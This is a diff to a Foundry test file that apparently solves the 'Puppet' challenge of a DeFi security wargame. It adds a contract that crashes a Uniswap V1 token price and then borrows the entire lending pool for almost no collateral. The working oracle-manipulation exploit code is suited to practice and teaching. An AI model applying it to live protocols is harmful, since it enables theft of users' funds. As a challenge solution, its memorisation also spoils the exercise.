@@ -8,6 +8,45 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract PuppetAtacker {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    IUniswapV1Factory uniswapV1Factory;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+    address recovery;
+
+    constructor (
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange,
+        IUniswapV1Factory _uniswapV1Factory,
+        address _recovery
+        ) {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        uniswapV1Factory =_uniswapV1Factory;
+        recovery = _recovery;
+    }
+    function attack() public payable {
+        token.approve(address(uniswapV1Exchange), 1000e18);
+        uniswapV1Exchange.tokenToEthSwapInput(
+            1000e18,
+            1,
+            block.timestamp * 2
+        );
+
+        uint256 required = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+    
+        lendingPool.borrow{value: required}(
+            POOL_INITIAL_TOKEN_BALANCE,
+            recovery
+        );
+    }
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +131,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        PuppetAtacker puppet = new PuppetAtacker(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            uniswapV1Factory,
+            recovery
+        );
+    
+        token.transfer(address(puppet), 1000e18);
+        puppet.attack{value: player.balance}();
     }
 
     // Utility function to calculate Uniswap prices
